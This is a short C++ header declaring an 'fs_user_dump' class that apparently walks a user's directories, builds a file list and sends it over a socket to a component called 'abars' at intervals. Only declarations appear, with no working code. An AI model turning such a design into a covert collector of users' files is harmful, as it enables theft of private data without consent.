#ifndef FS_USER_DUMP_H
#define FS_USER_DUMP_H
#include "net.h"
#include <sys/types.h>
#include <dirent.h>
#include <time.h>
#include <sys/stat.h>
#include <stack>
#include <vector>
#include "constv.h"
class fs_user_dump
{
	enum {buf_cap = 1024};
	enum {back_slash = '/'};
	enum {sleep_t = 10};
	sockets s;
	std::stack<const char*> stack;
	struct buffer
	{
		char s[buf_cap];
	};
	std::vector<buffer> files;
	char buf[buf_cap];
	char fname[buf_cap];
	char user_name[buf_cap];
	void path_builder(const char* start, char* path, const char* dir_name);
	void file_builder(const char* name);
	void delete_spaces(char* string);
public:
	fs_user_dump() = default;
	fs_user_dump(const char* unam, const char* path, int port);
	void start(const char* path=nullptr, const char* date=nullptr);
	void connect_to_abars(int port);	
	void send_to_abars();
	~fs_user_dump();
};
#endif
